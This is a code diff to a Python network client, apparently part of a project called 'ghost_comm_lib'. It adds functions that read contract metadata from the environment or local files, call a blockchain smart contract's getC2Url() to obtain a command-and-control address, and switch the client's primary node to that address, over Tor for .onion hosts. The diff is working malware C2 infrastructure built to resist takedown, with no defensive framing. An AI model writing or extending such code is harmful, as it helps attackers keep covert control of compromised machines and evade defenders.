@@ -4,13 +4,79 @@ import json
 import socks
 import socket
 import time
-from typing import Dict, Any
+import logging
+from pathlib import Path
+from typing import Dict, Any, Optional
 import pgpy
+
+import blockchain_utils
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))
 
 from ghost_comm_lib.crypto.utils import generate_pgp_key, decrypt_pgp, decrypt_aes, encrypt_pgp
 from ghost_comm_lib.network.client_connection import ClientConnection
+
+_LOGGER = logging.getLogger(__name__)
+
+
+def _candidate_contract_meta_paths() -> list[Path]:
+    candidates = []
+
+    env_path = os.environ.get("C2_CONTRACT_META")
+    if env_path:
+        candidates.append(Path(env_path).expanduser())
+
+    module_dir = Path(__file__).resolve()
+    candidates.append(module_dir.parent / "contract_meta.json")
+    candidates.append(module_dir.parent.parent / "contract_meta.json")
+    candidates.append(module_dir.parent.parent.parent / "contract_meta.json")
+
+    blockchain_dir = Path(blockchain_utils.__file__).resolve().parent
+    candidates.append(blockchain_dir / "contract_meta.json")
+
+    unique: list[Path] = []
+    seen = set()
+    for candidate in candidates:
+        try:
+            resolved = candidate.resolve()
+        except Exception:
+            resolved = candidate
+        if resolved in seen:
+            continue
+        seen.add(resolved)
+        unique.append(resolved)
+    return unique
+
+
+def _load_contract_meta() -> Optional[Dict[str, Any]]:
+    for path in _candidate_contract_meta_paths():
+        if not path.is_file():
+            continue
+        try:
+            with path.open("r", encoding="utf-8") as fh:
+                meta = json.load(fh)
+            _LOGGER.debug("Loaded contract metadata from %s", path)
+            return meta
+        except Exception as exc:
+            _LOGGER.warning("Failed reading contract metadata at %s: %s", path, exc)
+    return None
+
+
+def _resolve_c2_url_via_blockchain() -> Optional[str]:
+    meta = _load_contract_meta()
+    if not meta:
+        return None
+
+    try:
+        web3 = blockchain_utils.get_web3()
+        contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
+        url = contract.functions.getC2Url().call()
+        if url:
+            _LOGGER.info("Retrieved C2 URL from blockchain: %s", url)
+            return url
+    except Exception as exc:
+        _LOGGER.warning("Blockchain C2 lookup failed: %s", exc)
+    return None
 
 class Client:
     """Represents a client connecting to the network."""
@@ -23,9 +89,18 @@ class Client:
         self.tor_socks_proxy_host = tor_socks_proxy_host
         self.tor_socks_proxy_port = tor_socks_proxy_port
         self.connection = None
+        self.logger = logging.getLogger(f"{self.__class__.__module__}.{self.__class__.__name__}")
 
     def connect_to_primary_node(self):
         """Connects to the primary node. This connection might be direct or via Tor, depending on the primary_node_host."""
+        resolved_url = _resolve_c2_url_via_blockchain()
+        if resolved_url:
+            if resolved_url != self.primary_node_host:
+                self.logger.info("Switching primary node host to blockchain value: %s", resolved_url)
+            self.primary_node_host = resolved_url
+        else:
+            self.logger.debug("Using configured primary node host: %s", self.primary_node_host)
+
         use_tor = self.primary_node_host.endswith(".onion")
         self.connection = ClientConnection(
             self.primary_node_host,
